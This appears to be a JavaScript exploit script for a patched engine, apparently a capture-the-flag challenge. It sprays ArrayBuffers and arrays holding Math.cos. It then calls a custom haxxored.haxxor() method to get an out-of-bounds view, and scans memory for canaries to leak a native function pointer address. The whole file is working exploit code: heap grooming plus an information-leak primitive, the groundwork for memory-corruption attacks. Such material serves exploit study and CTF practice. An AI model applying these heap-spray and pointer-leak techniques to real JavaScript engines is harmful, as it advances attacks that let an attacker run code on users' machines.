// var x = 1;
// var global = {};

// function jit(x) {
//     global.a += x ^ 42;
// }

// print(x);

// global.a = 10;
// for(var i = 0; i < 8000; i++) {
//     jit(i);
// }

// print(global.a);

// first add an ArrayBuffer we haxxor
const haxxored = new ArrayBuffer(96);
// put a canary here to search for in gdb
new Uint32Array(haxxored)[0] = 0x41414141;

const abs = [];
// hopefully one of these land after our haxxored ArrayBuffer
for(var i = 0; i < 10; i++) {
    // ArrayBuffers with inline buffer backing store
    const x = new ArrayBuffer(96);
    new Uint32Array(x)[0] = 0x13371337;
    abs.push(x);

    // push simple object to get a native function pointer
    abs.push([0x42424242, Math.cos, 0x43434343]);
}

haxxored.haxxor();
const view = new Uint32Array(haxxored);

function hex(val) {
    return ('0'.repeat(8) + val.toString(16)).substr(-8);
}

for(var i = 0; i < 0x1338 / 4; i++) {
    const x = view[i];
    // look for canaries
    if(x == 0x13371337) {
        print("ArrayBuffer: " + i + ": " + hex(x));
    }

    // look for canaries
    if(x == 0x42424242) {
        print("Canary: " + i + ": " + hex(x));
        print("Addr: " + (i+2) + ": " + hex(view[i+3]) + hex(view[i+2]));
    }
}